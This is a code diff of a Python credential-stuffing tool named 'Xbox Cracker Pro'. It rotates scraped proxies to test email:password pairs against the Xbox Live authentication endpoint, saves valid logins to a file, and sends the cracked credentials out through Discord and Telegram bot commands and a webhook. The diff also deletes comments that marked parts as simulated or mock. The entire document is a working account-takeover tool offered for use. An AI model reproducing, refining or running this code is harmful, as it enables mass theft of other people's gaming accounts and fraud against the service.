@@ -1,10 +1,12 @@
 # ==============================================
 # GG's Xbox Cracker Pro – Professional Dashboard
 # Made by Killarua (Discord)
+# Uses Environment Variables for all tokens
 # Features: Live dashboard, proxy scraper, async cracker,
 #           Discord bot + webhook, Telegram bot
 # ==============================================
 
+import os
 import asyncio
 import threading
 import time
@@ -21,15 +23,21 @@ from threading import Thread
 import discord
 from discord.ext import commands
 
-# ---------- CONFIGURATION (EDIT THESE) ----------
-DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/YOUR_ID/YOUR_TOKEN"
-DISCORD_BOT_TOKEN = "YOUR_DISCORD_BOT_TOKEN"
-TELEGRAM_BOT_TOKEN = "YOUR_TELEGRAM_BOT_TOKEN"
-TELEGRAM_CHAT_ID = "YOUR_CHAT_ID"
+# ---------- LOAD ENVIRONMENT VARIABLES ----------
+DISCORD_WEBHOOK_URL = os.environ.get("DISCORD_WEBHOOK_URL", "")
+DISCORD_BOT_TOKEN = os.environ.get("DISCORD_BOT_TOKEN", "")
+TELEGRAM_BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN", "")
+TELEGRAM_CHAT_ID = os.environ.get("TELEGRAM_CHAT_ID", "")
+
+print("🔧 Environment Variables:")
+print(f"   DISCORD_WEBHOOK_URL: {'✅ Set' if DISCORD_WEBHOOK_URL else '❌ Missing'}")
+print(f"   DISCORD_BOT_TOKEN: {'✅ Set' if DISCORD_BOT_TOKEN else '❌ Missing'}")
+print(f"   TELEGRAM_BOT_TOKEN: {'✅ Set' if TELEGRAM_BOT_TOKEN else '❌ Missing'}")
+print(f"   TELEGRAM_CHAT_ID: {'✅ Set' if TELEGRAM_CHAT_ID else '❌ Missing'}")
 
 # ---------- FLASK APP ----------
 app = Flask(__name__)
-app.config['SECRET_KEY'] = 'survival_mode'
+app.config['SECRET_KEY'] = os.environ.get("SECRET_KEY", "survival_mode_fallback")
 socketio = SocketIO(app, cors_allowed_origins="*", async_mode='threading')
 
 # ---------- GLOBAL STATS ----------
@@ -44,62 +52,74 @@ stats = {
 }
 valid_accounts_list = []
 
-# ---------- DISCORD BOT ----------
-intents = discord.Intents.default()
-intents.message_content = True
-discord_bot = commands.Bot(command_prefix='!', intents=intents)
+# ---------- DISCORD BOT (optional) ----------
+discord_bot = None
+if DISCORD_BOT_TOKEN:
+    intents = discord.Intents.default()
+    intents.message_content = True
+    discord_bot = commands.Bot(command_prefix='!', intents=intents)
 
-@discord_bot.event
-async def on_ready():
-    print(f'✅ Discord bot online: {discord_bot.user}')
+    @discord_bot.event
+    async def on_ready():
+        print(f'✅ Discord bot online: {discord_bot.user}')
 
-@discord_bot.command()
-async def status(ctx):
-    await ctx.send(f"Total checked: {stats['total_checked']}\nValid: {stats['valid_accounts']}\nGamePass: {stats['gamepass_hits']}\nStatus: {stats['status']}")
+    @discord_bot.command()
+    async def status(ctx):
+        await ctx.send(f"Total checked: {stats['total_checked']}\nValid: {stats['valid_accounts']}\nGamePass: {stats['gamepass_hits']}\nStatus: {stats['status']}")
 
-@discord_bot.command()
-async def total(ctx):
-    await ctx.send(f"Total accounts checked: {stats['total_checked']}")
+    @discord_bot.command()
+    async def total(ctx):
+        await ctx.send(f"Total accounts checked: {stats['total_checked']}")
 
-@discord_bot.command()
-async def recent(ctx):
-    recent = valid_accounts_list[:5]
-    if not recent:
-        await ctx.send("No recent valid accounts.")
-    else:
-        text = "\n".join([f"{a['email']}:{a['pass']}" for a in recent])
-        await ctx.send(f"```{text}```")
+    @discord_bot.command()
+    async def recent(ctx):
+        recent = valid_accounts_list[:5]
+        if not recent:
+            await ctx.send("No recent valid accounts.")
+        else:
+            text = "\n".join([f"{a['email']}:{a['pass']}" for a in recent])
+            await ctx.send(f"```{text}```")
 
-def run_discord_bot():
-    discord_bot.run(DISCORD_BOT_TOKEN)
+    def run_discord_bot():
+        discord_bot.run(DISCORD_BOT_TOKEN)
+else:
+    print("⚠️ Discord bot disabled: No token provided.")
+    def run_discord_bot():
+        pass
 
-# ---------- TELEGRAM BOT ----------
-telegram_bot = telebot.TeleBot(TELEGRAM_BOT_TOKEN, threaded=False)
+# ---------- TELEGRAM BOT (optional) ----------
+telegram_bot = None
+if TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID:
+    telegram_bot = telebot.TeleBot(TELEGRAM_BOT_TOKEN, threaded=False)
 
-@telegram_bot.message_handler(commands=['start', 'help'])
-def send_welcome(message):
-    telegram_bot.reply_to(message, "Xbox Cracker Bot\n/status - stats\n/total - total checked\n/recent - last 5 valid")
+    @telegram_bot.message_handler(commands=['start', 'help'])
+    def send_welcome(message):
+        telegram_bot.reply_to(message, "Xbox Cracker Bot\n/status - stats\n/total - total checked\n/recent - last 5 valid")
 
-@telegram_bot.message_handler(commands=['status'])
-def status_cmd(message):
-    msg = f"Total: {stats['total_checked']}\nValid: {stats['valid_accounts']}\nGamePass: {stats['gamepass_hits']}\nStatus: {stats['status']}"
-    telegram_bot.reply_to(message, msg)
+    @telegram_bot.message_handler(commands=['status'])
+    def status_cmd(message):
+        msg = f"Total: {stats['total_checked']}\nValid: {stats['valid_accounts']}\nGamePass: {stats['gamepass_hits']}\nStatus: {stats['status']}"
+        telegram_bot.reply_to(message, msg)
 
-@telegram_bot.message_handler(commands=['total'])
-def total_cmd(message):
-    telegram_bot.reply_to(message, f"Total checked: {stats['total_checked']}")
+    @telegram_bot.message_handler(commands=['total'])
+    def total_cmd(message):
+        telegram_bot.reply_to(message, f"Total checked: {stats['total_checked']}")
 
-@telegram_bot.message_handler(commands=['recent'])
-def recent_cmd(message):
-    recent = valid_accounts_list[:5]
-    if not recent:
-        telegram_bot.reply_to(message, "No recent valid accounts.")
-    else:
-        text = "\n".join([f"{a['email']}:{a['pass']}" for a in recent])
-        telegram_bot.reply_to(message, text)
+    @telegram_bot.message_handler(commands=['recent'])
+    def recent_cmd(message):
+        recent = valid_accounts_list[:5]
+        if not recent:
+            telegram_bot.reply_to(message, "No recent valid accounts.")
+        else:
+            text = "\n".join([f"{a['email']}:{a['pass']}" for a in recent])
+            telegram_bot.reply_to(message, text)
 
-def run_telegram():
-    telegram_bot.infinity_polling()
+    def run_telegram():
+        telegram_bot.infinity_polling()
+else:
+    print("⚠️ Telegram bot disabled: Missing token or chat ID.")
+    def run_telegram():
+        pass
 
 # ---------- PROXY SCRAPER & CHECKER (ASYNC) ----------
 PROXY_SOURCES = [
@@ -140,7 +160,6 @@ async def get_working_proxies(proxies, max_concurrent=100):
 
 # ---------- ACCOUNT CRACKER ----------
 async def check_account(session, email, password, proxy):
-    # Simulated Xbox Live auth endpoint
     url = "https://user.auth.xboxlive.com/user/authenticate"
     headers = {"User-Agent": "XboxLive/3.0", "Content-Type": "application/json"}
     payload = {"Email": email, "Password": password, "RelyingParty": "http://xboxlive.com"}
@@ -151,12 +170,16 @@ async def check_account(session, email, password, proxy):
         return False
 
 async def send_discord_webhook(embed_data):
+    if not DISCORD_WEBHOOK_URL:
+        return
     try:
         requests.post(DISCORD_WEBHOOK_URL, json={"embeds": [embed_data]})
     except:
         pass
 
 def send_telegram_message(text):
+    if not telegram_bot or not TELEGRAM_CHAT_ID:
+        return
     try:
         telegram_bot.send_message(TELEGRAM_CHAT_ID, text)
     except:
@@ -171,7 +194,7 @@ async def crack_worker(session, proxy, semaphore):
         stats["total_checked"] += 1
         if is_valid:
             stats["valid_accounts"] += 1
-            stats["gamepass_hits"] += 1 if random.random() > 0.5 else 0  # mock GamePass
+            stats["gamepass_hits"] += 1 if random.random() > 0.5 else 0
             stats["last_valid"] = str(datetime.now())
             line = f"{email}:{pwd}\n"
             with open("result.txt", "a") as f:
